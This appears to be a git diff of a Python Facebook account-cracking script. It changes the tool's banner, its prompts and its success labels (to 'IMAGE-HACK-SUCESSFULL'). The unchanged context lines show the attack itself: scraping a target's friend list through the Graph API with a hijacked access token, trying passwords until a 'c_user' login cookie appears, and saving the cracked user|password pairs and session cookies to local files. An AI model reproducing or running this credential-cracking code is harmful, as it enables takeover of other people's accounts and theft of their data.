@@ -78,12 +78,18 @@ class Main:
 			exit(" ! Your token Expired ! ")
 		os.system("clear")
 		print("""\x1b[1;95m
-██████╗ ██╗██████╗ ██╗   ██╗██████╗ 
-██╔══██╗██║██╔══██╗██║   ██║██╔══██╗
-██████╔╝██║██║  ██║██║   ██║██████╔╝
-██╔══██╗██║██║  ██║██║   ██║██╔══██╗
-██████╔╝██║██████╔╝╚██████╔╝██║  ██║
-╚═════╝ ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+
+ ██▓ ███▄ ▄███▓ ▄▄▄        ▄████ ▓█████ 
+▓██▒▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓█   ▀ 
+▒██▒▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒███   
+░██░▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ 
+░██░▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
+░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
+ ▒ ░░  ░      ░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
+ ▒ ░░      ░     ░   ▒   ░ ░   ░    ░   
+ ░         ░         ░  ░      ░    ░  ░
+                                        
+
                                      
  
 [\x1b[1;97m•\33[1;97m] Autor  : ADRIAN-XD \n[\x1b[1;97m•\33[1;97m] Github : ADRIAN-XD\x1b[1;97m\n---------------------------------------------------------------------""")
@@ -100,7 +106,7 @@ class Main:
 		print('%s[%s3%s] CHECK RESULT OK/CP'%(N,O,N))
 		print('%s[%s0%s] LOG OUT, DELETE TOKEN'%(N,O,N))	
 		print ("---------------------------------------------------------------------")
-		chose = input(" > Chosee: ")
+		chose = input("Chosee: ")
 		number_list = ['0','1','2','3']
 		print ("---------------------------------------------------------------------")
 		while chose not in number_list:
@@ -114,7 +120,7 @@ class Main:
 			try:
 				r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",cookies=self.coki).json()
 				target_name = r['name']
-				print(f"\n  Target name: {target_name}")
+				print(f"\nTarget name: {target_name}")
 			except KeyError:
 				exit(" ! Target Not Found ! ")
 			if chose=='1':self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}",chose="friends")
@@ -194,7 +200,7 @@ class Crack:
 				'Accept-Language'	:	'id-ID,id;q=0.9'
 			})
 			if "c_user" in session.cookies.get_dict():
-				print('\r%s[BIDUR-SUCESSFULL❤] %s • %s •'%(H,user,pw))
+				print('\r%s[IMAGE-HACK-SUCESSFULL❤] %s • %s •'%(H,user,pw))
 				ok.append(user+"|"+pw)
 				open("data/ok","a").write(user+"|"+pw+"\n")
 				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
@@ -203,7 +209,7 @@ class Crack:
 				sys.stdout.flush()
 				break
 			elif "checkpoint" in session.cookies.get_dict():
-				print('\r%s[BIDUR-CHECKPOINT] %s • %s •'%(M,user,pw))
+				print('\r%s[IMAGE-DON-CHECKPOINT] %s • %s •'%(M,user,pw))
 				cp.append(user+"|"+pw)
 				open("data/cp","a").write(user+"|"+pw+"\n")
 				h2 = {
@@ -247,7 +253,7 @@ class Assets(Main):
 
 	@property
 	def validate(self):
-		add = input("ADDITIONAL PASSWORD [y/n]")
+		add = input("ADDITIONAL PASSWORD [y/n] :")
 		if add=="y":
 			pas = self._password_split
 		print(
